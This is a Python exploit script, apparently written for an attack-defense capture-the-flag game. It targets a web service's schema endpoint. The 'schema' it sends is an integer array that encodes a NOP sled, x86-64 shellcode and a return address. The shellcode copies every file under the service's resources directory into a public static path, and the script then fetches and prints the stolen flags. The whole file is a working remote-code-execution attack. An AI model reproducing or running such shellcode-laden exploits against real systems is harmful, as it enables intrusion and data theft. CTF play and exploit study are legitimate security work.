#!/usr/bin/env python3.9
import random
import string
import requests


REGISTER_URL = "http://{hostname}:{port}/register"
SET_SCHEMA_URL = "http://{hostname}:{port}/set_schema/{resource_uuid}"
UPLOAD_RESOURCE_URL = "http://{hostname}:{port}/upload_resource"
FLAGS_URL = "http://{hostname}:{port}/static/css/flags"
SCHEMA = {"groups":[[2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,
                     2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,
                     2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,
                     2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,
                     2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,1647294536,1932488297,
                     1352204392,1716674388,1415785832,937972318,1660944384,606106721,1852401192,1701978212,1920298867,796091747,2037656864,1713399152,1702051369,1919252082,1635021615,
                     795044212,796095331,1734437990,1465254003,996826708,331608,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,
                     2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,2425393296,4294960388,32767]]}
# sploit for linux/x_64 with NOP's and command: cat $(find resources/ -type f)>server/static/css/flags


def register(hostname, port, username, password):
    session = requests.Session()
    url = REGISTER_URL.format(hostname=hostname, port=port)
    data = {
        "name": username,
        "password": password,
    }
    r = session.post(url, json=data)
    r.raise_for_status()
    return session


def upload_resource(hostname, port, session, data):
    url = UPLOAD_RESOURCE_URL.format(hostname=hostname, port=port)
    r = session.post(url, data=data)
    r.raise_for_status()
    return r.content.decode()


def set_schema(hostname, port, session, resource_uuid):
    url = SET_SCHEMA_URL.format(hostname=hostname, port=port, resource_uuid=resource_uuid)
    r = session.post(url, json=SCHEMA)
    r.raise_for_status()


def get_flags(hostname, port):
    url = FLAGS_URL.format(hostname=hostname, port=port)
    r = requests.get(url)
    r.raise_for_status()
    return r.content.decode()


def main():
    host = "10.118.103.13"
    port = 3000
    session = register(host, port, ''.join(random.choice(string.ascii_letters) for _ in range(10)), "password")
    uuid = upload_resource(host, port, session, '')
    set_schema(host, port, session, uuid)
    flags = get_flags(host, port)
    for i in range(len(flags) // 32):
        print(flags[i * 32:i * 32 + 32])


if __name__ == '__main__':
    main()
